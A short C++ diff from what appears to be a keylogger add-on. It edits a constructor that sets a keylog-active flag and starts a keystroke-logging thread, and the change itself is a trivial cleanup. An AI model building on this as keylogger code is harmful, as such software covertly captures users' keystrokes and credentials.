@@ -17,9 +17,8 @@ std::queue<char> keyQueue;
 
 addonKeylog::addonKeylog()
 {
-	this->keylogThread = NULL;
-
 	this->keylog_active = true;
+
 	this->keylogThread = gThread->Start((LPTHREAD_START_ROUTINE)keylog_thread);
 }
 
